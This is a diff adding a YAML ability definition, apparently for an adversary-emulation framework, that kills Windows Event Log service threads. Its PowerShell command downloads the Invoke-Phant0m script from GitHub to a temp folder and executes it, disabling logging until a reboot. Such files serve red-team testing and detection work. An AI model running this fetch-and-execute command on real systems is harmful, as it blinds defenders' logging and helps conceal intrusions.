@@ -1,0 +1,23 @@
+---
+- id: 47ba984c0c40a7c41b4797156c1a5f96
+  name: Kill Event Log Service Threads
+  description: Kill Windows Event Log Service Threads using Invoke-Phant0m. WARNING
+    you will need to restart PC to return to normal state with Log Service. https://artofpwn.com/phant0m-killing-windows-event-log.html
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685.001
+    name: 'Disable or Modify Tools: Disable or Modify Windows Event Log'
+  platforms:
+    windows:
+      psh:
+        command: Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
+          -ErrorAction Ignore; $url = "https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1";
+          $output = "$env:TEMP\Invoke-Phant0m.ps1"; $wc = New-Object System.Net.WebClient;
+          $wc.DownloadFile($url, $output); cd $env:TEMP; Import-Module .\Invoke-Phant0m.ps1;
+          Invoke-Phant0m
+        payloads: []
+        cleanup: Write-Host "NEED TO Restart-Computer TO ENSURE LOGGING RETURNS" -fore
+          red; Remove-Item "$env:TEMP\Invoke-Phant0m.ps1" -ErrorAction Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
